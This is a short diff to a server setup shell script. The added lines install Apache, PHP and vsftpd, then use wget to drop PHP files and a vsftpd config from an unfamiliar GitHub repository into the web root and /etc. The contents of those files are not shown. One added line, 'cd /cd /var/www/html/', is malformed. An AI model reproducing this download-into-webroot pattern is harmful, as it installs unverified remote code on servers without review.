@@ -2,6 +2,18 @@ sudo apt-get -y install xserver-xorg-video-dummy
 
 sudo apt-get -y install vsftpd
 
+sudo apt-get -y install apache2
+
+sudo apt-get -y install php
+
+cd /cd /var/www/html/
+
+wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/index.php
+
+cd /cd /var/www/html/
+
+wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/index84.php
+
 cd /etc/
 
 wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/vsftpd.conf
